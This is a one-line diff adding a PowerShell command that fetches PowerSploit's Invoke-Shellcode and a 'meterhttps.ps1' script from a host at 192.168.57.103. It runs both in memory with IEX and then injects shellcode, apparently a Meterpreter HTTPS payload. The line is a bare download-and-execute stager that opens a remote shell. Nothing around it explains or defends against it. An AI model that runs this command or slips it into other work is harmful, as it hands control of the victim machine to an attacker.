@@ -1,0 +1,1 @@
+IEX (New-Object Net.WebClient).DownloadString('http://192.168.57.103/PowerSploit/CodeExecution/Invoke-Shellcode.ps1'); IEX (New-Object Net.WebClient).DownloadString('http://192.168.57.103/meterhttps.ps1'); Invoke-Shellcode -Shellcode @($buf) -force
